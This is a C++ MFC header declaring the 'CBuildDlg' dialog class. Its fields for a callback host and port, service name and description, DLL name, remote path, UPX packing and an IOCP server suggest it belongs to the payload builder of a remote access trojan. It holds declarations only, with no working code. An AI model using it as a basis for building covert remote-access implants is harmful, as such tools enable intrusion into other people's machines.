#if !defined(AFX_BUILDDLG_H__77F21CCD_63BA_4FC2_B85E_3F5567CB925D__INCLUDED_)
#define AFX_BUILDDLG_H__77F21CCD_63BA_4FC2_B85E_3F5567CB925D__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// BuildDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CBuildDlg dialog

class CBuildDlg : public CDialog
{
// Construction
	
public:
	CBuildDlg(CWnd* pParent = NULL);   // standard constructor
	void TestMaster(char * strIP,UINT nPort);
	BOOL IsFileExist(LPCTSTR strFileName);
	BOOL CompressUpx(CString inpath);
// Dialog Data
	//{{AFX_DATA(CBuildDlg)
	enum { IDD = IDD_DIALOG_BUILD };
	CEdit	m_edit_log;
	CStatic	m_Ico;
	CComboBox	m_group_name;
	CComboBox	m_remote_path;
	CComboBox	m_FileAttrbute;
// 	CComboBox	m_fileattribute;
// 	CComboBox	m_filealeixing;
	CString m_releasepath;
	CString	m_edit_host;
	CString	m_service_name;
	CString	m_service_displayname;
	CString	m_service_description;
	CString	m_DllName;
	CString	Fenzu;
	UINT	m_edit_port;
	CString	Baocun;
	CString	m_edit_kb;
	CHAR	m_zrAzst;
	BOOL	m_zraz;
	BOOL	m_zraz1;
	BOOL	m_zraz2;
	BOOL	Pattern;
	BOOL    m_fwb;
	BOOL    m_fhb;
	BOOL    m_fxn;
	BOOL    m_ffx;
	BOOL    m_fsc;
	BOOL    m_fzs;
	BOOL    m_fcf;
	BOOL    m_ffh;
	BOOL    m_fct;
	BOOL    m_fzj;
	BOOL	m_fkb;
	BOOL	m_fbc;
	BOOL	m_fsm;
	BOOL	m_flx;
	BOOL    m_fwr;
	BOOL	m_upx;

	//}}AFX_DATA
	DLL_INFO m_dll_info;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CBuildDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	char DatPath[MAX_PATH];
    char patht[MAX_PATH];
	// Generated message map functions
	//{{AFX_MSG(CBuildDlg)
	virtual BOOL OnInitDialog();
	virtual void OnOK();
	afx_msg void OnPaint();
	afx_msg void OnSelectIco();
	afx_msg void OnButtonTestConnect();
	afx_msg void OnRandom();
	afx_msg void OnKbtest();
	afx_msg void OnKbcheck();
	afx_msg void OnPattern();
	afx_msg void OnTest();
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	void LogOut(LPCSTR outtext);
	afx_msg void Ontixin1();
	afx_msg void Ontixin2();
	afx_msg void Ontixin3();
	afx_msg void Ontixin4();
	afx_msg void Ontixin5();
	afx_msg void Ontixin6();
	afx_msg void Ontixin7();
	afx_msg void Ontixin8();
	afx_msg void Ontixin9();
	afx_msg void Ontixin10();
	afx_msg void Ontixin11();
	afx_msg void Ontixin12();
	afx_msg void Ontixin13();
	afx_msg void Ontixin14();
	afx_msg void Ontixin15();
	afx_msg void OnZras();
	afx_msg void OnZras1();
	afx_msg void OnZraz();
	afx_msg void OnZraz1();
	afx_msg void OnZraz2();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_BUILDDLG_H__77F21CCD_63BA_4FC2_B85E_3F5567CB925D__INCLUDED_)
